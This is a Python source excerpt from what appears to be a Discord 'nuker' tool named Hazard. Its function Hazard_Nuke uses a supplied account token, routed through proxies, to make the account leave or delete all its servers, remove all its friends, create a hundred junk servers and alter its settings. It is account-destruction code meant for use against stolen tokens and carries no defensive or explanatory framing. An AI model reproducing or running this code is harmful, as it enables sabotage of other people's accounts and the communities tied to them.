...
import Hazard
from util.plugins.common import SlowPrint, getheaders, proxy, setTitle
...
def Hazard_Nuke(token, Server_Name, message_Content):
    ...
    for guild in guildsIds:
        try:
            requests.delete(
                f'https://discord.com/api/v10/users/@me/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
    ...
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v10/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
    ...
    friendIds = requests.get("https://discord.com/api/v10/users/@me/relationships", proxies=proxy(), headers=getheaders(token)).json()
    for friend in friendIds:
        try:
            requests.delete(
                f'https://discord.com/api/v10/users/@me/relationships/'+friend['id'], proxies=proxy(), headers=getheaders(token))
    ...
    for i in range(100):
        try:
            ...
            requests.post('https://discord.com/api/v10/guilds', proxies=proxy(), headers=getheaders(token), json=payload)
    ...
    t.do_run = False
    requests.delete("https://discord.com/api/v10/hypesquad/online", proxies=proxy(), headers=getheaders(token))
    setting = {
          'theme': "light",
          'locale': "ja",
    ...
    requests.patch("https://discord.com/api/v10/users/@me/settings", proxies=proxy(), headers=getheaders(token), json=setting)
    j = requests.get("https://discordapp.com/api/v10/users/@me", proxies=proxy(), headers=getheaders(token)).json()
